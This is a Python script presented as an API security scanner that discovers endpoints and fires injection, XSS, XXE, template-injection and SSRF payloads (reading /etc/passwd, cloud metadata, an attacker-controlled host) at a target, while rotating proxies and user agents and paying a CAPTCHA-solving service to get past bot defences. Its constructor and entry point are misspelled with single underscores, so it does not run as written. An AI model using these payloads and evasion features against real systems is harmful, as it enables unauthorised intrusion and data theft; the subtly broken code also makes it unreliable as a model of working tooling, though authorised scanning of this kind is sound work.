python

import requests
import argparse
import time
import random
import logging
from colorama import Fore, Style
from requests.auth import HTTPBasicAuth
from requests.exceptions import RequestException

# Banner
BANNER = """
=====================================
        HOTPOT API SCANNER
      Authority by: Nonam3-S3C
         Version: v.0.1.3
=====================================
"""

def print_banner():
    print(Fore.MAGENTA + BANNER + Style.RESET_ALL)

# Configuration
REQUEST_DELAY = 1  # Delay between requests (seconds)
DEFAULT_WORDLIST = "common_endpoints.txt"  # Replace with your wordlist or use a custom one

# Common API endpoints (fallback if no wordlist is provided)
COMMON_ENDPOINTS = [
    "users", "login", "admin", "api", "v1", "v2", "products", "orders", 
    "config", "settings", "profile", "data", "search", "health", "docs", 
    "swagger", "openapi", "token", "auth", "graphql", "soap"
]

# Random User-Agents
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 10; SM-A505FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36"
]

# Proxies for IP rotation
PROXIES = [
    "http://proxy1:port",
    "http://proxy2:port",
    "http://proxy3:port"
]

# CAPTCHA API
CAPTCHA_API_KEY = "YOUR_2CAPTCHA_API_KEY"  # Replace with your 2Captcha API key
CAPTCHA_SOLVE_URL = "http://2captcha.com/in.php"
CAPTCHA_RESULT_URL = "http://2captcha.com/res.php"

# Logging
logging.basicConfig(filename="scan_logs.txt", level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

def get_random_user_agent():
    return random.choice(USER_AGENTS)

def get_random_proxy():
    return random.choice(PROXIES)

def random_delay():
    return random.uniform(1, 5)  # Random delay between 1 and 5 seconds

class APIScanner:
    def _init_(self, url, auth=None, headers=None, wordlist=None):
        self.url = url
        self.auth = auth
        self.headers = headers or {}
        self.wordlist = wordlist
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": get_random_user_agent(),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,/;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Referer": self.url
        })
        self.session.proxies.update({"http": get_random_proxy(), "https": get_random_proxy()})
        if self.auth:
            if self.auth.get("type") == "basic":
                self.session.auth = HTTPBasicAuth(self.auth["username"], self.auth["password"])
            elif self.auth.get("type") == "bearer":
                self.session.headers.update({"Authorization": f"Bearer {self.auth['token']}"})
            elif self.auth.get("type") == "apikey":
                self.session.headers.update({"X-API-Key": self.auth["key"]})

    def solve_captcha(self, site_key, url):
        try:
            # Submit CAPTCHA to 2Captcha
            captcha_id = self.session.post(
                CAPTCHA_SOLVE_URL,
                data={
                    "key": CAPTCHA_API_KEY,
                    "method": "userrecaptcha",
                    "googlekey": site_key,
                    "pageurl": url
                }
            ).text.split("|")[1]

            # Wait for CAPTCHA to be solved
            time.sleep(20)  # Adjust based on CAPTCHA complexity
            result = self.session.get(
                CAPTCHA_RESULT_URL,
                params={"key": CAPTCHA_API_KEY, "action": "get", "id": captcha_id}
            ).text

            if "OK" in result:
                return result.split("|")[1]  # Return the solved CAPTCHA token
            else:
                logging.error(f"CAPTCHA solving failed: {result}")
                return None
        except Exception as e:
            logging.error(f"Error solving CAPTCHA: {str(e)}")
            return None

    def discover_endpoints(self):
        print(Fore.CYAN + "[*] Discovering API endpoints..." + Style.RESET_ALL)
        endpoints = []
        wordlist = self.load_wordlist()
        if not wordlist:
            print(Fore.RED + "[!] No wordlist available. Exiting." + Style.RESET_ALL)
            return endpoints

        for endpoint in wordlist:
            test_url = f"{self.url}/{endpoint}"
            try:
                response = self.session.get(test_url, timeout=10)
                time.sleep(random_delay())
                if response.status_code == 200:
                    print(Fore.GREEN + f"[+] Discovered endpoint: /{endpoint}" + Style.RESET_ALL)
                    endpoints.append(endpoint)
                    logging.info(f"Discovered endpoint: /{endpoint}")
                else:
                    print(Fore.RED + f"[-] Endpoint not found: /{endpoint} (HTTP {response.status_code})" + Style.RESET_ALL)
                    logging.warning(f"Endpoint not found: /{endpoint} (HTTP {response.status_code})")
            except RequestException as e:
                print(Fore.RED + f"[!] Error testing {endpoint}: {str(e)}" + Style.RESET_ALL)
                logging.error(f"Error testing {endpoint}: {str(e)}")
            except Exception as e:
                print(Fore.RED + f"[!] Unexpected error testing {endpoint}: {str(e)}" + Style.RESET_ALL)
                logging.error(f"Unexpected error testing {endpoint}: {str(e)}")
        return endpoints

    def load_wordlist(self):
        if self.wordlist:
            try:
                with open(self.wordlist, "r") as f:
                    return [line.strip() for line in f.readlines()]
            except FileNotFoundError:
                print(Fore.RED + f"[!] Wordlist {self.wordlist} not found. Using default endpoints." + Style.RESET_ALL)
                logging.warning(f"Wordlist {self.wordlist} not found. Using default endpoints.")
                return COMMON_ENDPOINTS
            except Exception as e:
                print(Fore.RED + f"[!] Error loading wordlist: {str(e)}" + Style.RESET_ALL)
                logging.error(f"Error loading wordlist: {str(e)}")
                return COMMON_ENDPOINTS
        else:
            return COMMON_ENDPOINTS

    def check_broken_object_level_authorization(self):
        print(Fore.YELLOW + "[*] Testing Broken Object Level Authorization..." + Style.RESET_ALL)
        test_endpoint = f"{self.url}/users/1"
        try:
            response = self.session.get(test_endpoint, timeout=10)
            if response.status_code == 200:
                print(Fore.RED + "[!] Potential BOLA vulnerability detected!" + Style.RESET_ALL)
                logging.critical("Potential BOLA vulnerability detected!")
            else:
                logging.info("No BOLA vulnerability detected.")
        except RequestException as e:
            print(Fore.RED + f"[!] Error testing BOLA: {str(e)}" + Style.RESET_ALL)
            logging.error(f"Error testing BOLA: {str(e)}")
        except Exception as e:
            print(Fore.RED + f"[!] Unexpected error testing BOLA: {str(e)}" + Style.RESET_ALL)
            logging.error(f"Unexpected error testing BOLA: {str(e)}")

    def check_injection(self):
        print(Fore.YELLOW + "[*] Testing Injection Vulnerabilities..." + Style.RESET_ALL)
        test_endpoint = f"{self.url}/search"
        
        # Payloads for SQL Injection, RCE, XSS, Command Injection, XXE, Template Injection
        payloads = [
            # SQL Injection
            {"query": "' OR '1'='1"},
            {"query": "' AND SLEEP(5)--"},
            {"query": "' AND 1=CONVERT(int, (SELECT @@version))--"},
            {"query": "' UNION SELECT null, username, password FROM users--"},
            
            # Remote Code Execution (RCE)
            {"cmd": "; ls"},
            {"cmd": "| cat /etc/passwd"},
            {"cmd": "whoami"},
            {"input": "<?php echo shell_exec('whoami'); ?>"},
            
            # Cross-Site Scripting (XSS)
            {"input": "<script>alert(1)</script>"},
            {"input": "<img src=x onerror=alert(1)>"},
            {"input": "<svg/onload=alert(1)>"},
            {"input": "'\"><script>alert(1)</script>"},
            
            # Command Injection
            {"input": "; ls"},
            {"input": "| cat /etc/passwd"},
            {"input": "whoami"},
            
            # XXE (XML External Entity)
            {"xml": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>"},
            
            # Template Injection
            {"input": "{{7*7}}"},
            {"input": "{{config}}"}
        ]

        for payload in payloads:
            try:
                response = self.session.get(test_endpoint, params=payload, timeout=10)
                
                # Check for SQL Injection
                if "error" in response.text.lower() or "sql" in response.text.lower():
                    print(Fore.RED + f"[!] Potential SQL Injection vulnerability detected with payload: {payload}" + Style.RESET_ALL)
                    logging.critical(f"Potential SQL Injection vulnerability detected with payload: {payload}")
                
                # Check for RCE
                if "root" in response.text or "www-data" in response.text or "uid=" in response.text:
                    print(Fore.RED + f"[!] Potential RCE vulnerability detected with payload: {payload}" + Style.RESET_ALL)
                    logging.critical(f"Potential RCE vulnerability detected with payload: {payload}")
                
                # Check for XSS
                if "<script>alert(1)</script>" in response.text or "<img src=x onerror=alert(1)>" in response.text:
                    print(Fore.RED + f"[!] Potential XSS vulnerability detected with payload: {payload}" + Style.RESET_ALL)
                    logging.critical(f"Potential XSS vulnerability detected with payload: {payload}")
                
                # Check for Command Injection
                if "uid=" in response.text or "root" in response.text:
                    print(Fore.RED + f"[!] Potential Command Injection vulnerability detected with payload: {payload}" + Style.RESET_ALL)
                    logging.critical(f"Potential Command Injection vulnerability detected with payload: {payload}")
                
                # Check for XXE
                if "root:" in response.text or "www-data:" in response.text:
                    print(Fore.RED + f"[!] Potential XXE vulnerability detected with payload: {payload}" + Style.RESET_ALL)
                    logging.critical(f"Potential XXE vulnerability detected with payload: {payload}")
                
                # Check for Template Injection
                if "49" in response.text or "config" in response.text:
                    print(Fore.RED + f"[!] Potential Template Injection vulnerability detected with payload: {payload}" + Style.RESET_ALL)
                    logging.critical(f"Potential Template Injection vulnerability detected with payload: {payload}")
                
                # If no vulnerabilities detected
                else:
                    print(Fore.GREEN + f"[+] No injection vulnerability detected with payload: {payload}" + Style.RESET_ALL)
                    logging.info(f"No injection vulnerability detected with payload: {payload}")
            
            except RequestException as e:
                print(Fore.RED + f"[!] Error testing Injection with payload {payload}: {str(e)}" + Style.RESET_ALL)
                logging.error(f"Error testing Injection with payload {payload}: {str(e)}")
            except Exception as e:
                print(Fore.RED + f"[!] Unexpected error testing Injection with payload {payload}: {str(e)}" + Style.RESET_ALL)
                logging.error(f"Unexpected error testing Injection with payload {payload}: {str(e)}")

    def check_idor(self):
        print(Fore.YELLOW + "[*] Testing Insecure Direct Object Reference (IDOR)..." + Style.RESET_ALL)
        test_cases = [
            {"endpoint": f"{self.url}/users/1", "description": "Numeric user ID"},
            {"endpoint": f"{self.url}/users/550e8400-e29b-41d4-a716-446655440000", "description": "UUID user ID"},
            {"endpoint": f"{self.url}/orders/1", "description": "Numeric order ID"},
            {"endpoint": f"{self.url}/products/1", "description": "Numeric product ID"},
            {"endpoint": f"{self.url}/profile?id=1", "description": "Query parameter ID"},
            {"endpoint": f"{self.url}/data/123abc", "description": "Alphanumeric ID"}
        ]

        for case in test_cases:
            try:
                response = self.session.get(case["endpoint"], timeout=10)
                if response.status_code == 200:
                    print(Fore.RED + f"[!] Potential IDOR vulnerability detected: {case['description']} at {case['endpoint']}" + Style.RESET_ALL)
                    logging.critical(f"Potential IDOR vulnerability detected: {case['description']} at {case['endpoint']}")
                else:
                    print(Fore.GREEN + f"[+] No IDOR vulnerability detected: {case['description']} at {case['endpoint']}" + Style.RESET_ALL)
                    logging.info(f"No IDOR vulnerability detected: {case['description']} at {case['endpoint']}")
            except RequestException as e:
                print(Fore.RED + f"[!] Error testing IDOR at {case['endpoint']}: {str(e)}" + Style.RESET_ALL)
                logging.error(f"Error testing IDOR at {case['endpoint']}: {str(e)}")
            except Exception as e:
                print(Fore.RED + f"[!] Unexpected error testing IDOR at {case['endpoint']}: {str(e)}" + Style.RESET_ALL)
                logging.error(f"Unexpected error testing IDOR at {case['endpoint']}: {str(e)}")

    def check_ssrf(self):
        print(Fore.YELLOW + "[*] Testing Server-Side Request Forgery (SSRF)..." + Style.RESET_ALL)
        test_cases = [
            {"payload": {"url": "http://169.254.169.254/latest/meta-data/"}, "description": "AWS metadata endpoint"},
            {"payload": {"url": "http://metadata.google.internal/computeMetadata/v1/"}, "description": "GCP metadata endpoint"},
            {"payload": {"url": "http://169.254.169.254/metadata/instance?api-version=2021-02-01"}, "description": "Azure metadata endpoint"},
            {"payload": {"url": "http://192.168.1.1/admin"}, "description": "Internal IP address"},
            {"payload": {"url": "http://attacker-controlled-server.com"}, "description": "External server"},
            {"payload": {"url": "http://localhost:8080/admin"}, "description": "Localhost"},
            {"payload": {"url": "http://example.com@attacker-controlled-server.com"}, "description": "URL obfuscation"},
            {"payload": {"url": "http://attacker-controlled-server.com:80"}, "description": "Port specification"}
        ]

        for case in test_cases:
            try:
                response = self.session.post(f"{self.url}/fetch", data=case["payload"], timeout=10)
                if "metadata" in response.text or "internal" in response.text or "admin" in response.text:
                    print(Fore.RED + f"[!] Potential SSRF vulnerability detected: {case['description']} with payload {case['payload']}" + Style.RESET_ALL)
                    logging.critical(f"Potential SSRF vulnerability detected: {case['description']} with payload {case['payload']}")
                else:
                    print(Fore.GREEN + f"[+] No SSRF vulnerability detected: {case['description']} with payload {case['payload']}" + Style.RESET_ALL)
                    logging.info(f"No SSRF vulnerability detected: {case['description']} with payload {case['payload']}")
            except RequestException as e:
                print(Fore.RED + f"[!] Error testing SSRF with payload {case['payload']}: {str(e)}" + Style.RESET_ALL)
                logging.error(f"Error testing SSRF with payload {case['payload']}: {str(e)}")
            except Exception as e:
                print(Fore.RED + f"[!] Unexpected error testing SSRF with payload {case['payload']}: {str(e)}" + Style.RESET_ALL)
                logging.error(f"Unexpected error testing SSRF with payload {case['payload']}: {str(e)}")

    def scan(self):
        print_banner()
        print(Fore.CYAN + f"[*] Scanning {self.url}..." + Style.RESET_ALL)
        try:
            endpoints = self.discover_endpoints()
            if endpoints:
                self.check_broken_object_level_authorization()
                self.check_injection()
                self.check_idor()
                self.check_ssrf()
        except Exception as e:
            print(Fore.RED + f"[!] Fatal error during scanning: {str(e)}" + Style.RESET_ALL)
            logging.error(f"Fatal error during scanning: {str(e)}")

if _name_ == "_main_":
    parser = argparse.ArgumentParser(description="Advanced API Security Scanner")
    parser.add_argument("-u", "--url", required=True, help="Base URL of the API")
    parser.add_argument("-w", "--wordlist", help="Custom wordlist for endpoint discovery")
    parser.add_argument("--basic-auth", nargs=2, metavar=("USERNAME", "PASSWORD"), help="Basic Authentication")
    parser.add_argument("--bearer-token", help="Bearer Token Authentication")
    parser.add_argument("--api-key", help="API Key Authentication")
    args = parser.parse_args()

    # Validate URL
    if not args.url.startswith(("http://", "https://")):
        print(Fore.RED + "[!] Invalid URL. Must start with http:// or https://" + Style.RESET_ALL)
        exit(1)

    # Configure authentication
    auth_config = {}
    if args.basic_auth:
        auth_config = {"type": "basic", "username": args.basic_auth[0], "password": args.basic_auth[1]}
    elif args.bearer_token:
        auth_config = {"type": "bearer", "token": args.bearer_token}
    elif args.api_key:
        auth_config = {"type": "apikey", "key": args.api_key}

    # Ensure URL ends with a slash
    base_url = args.url if args.url.endswith("/") else args.url + "/"

    # Initialize and run scanner
    scanner = APIScanner(
        url=base_url,
        auth=auth_config,
        wordlist=args.wordlist
    )
    scanner.scan()
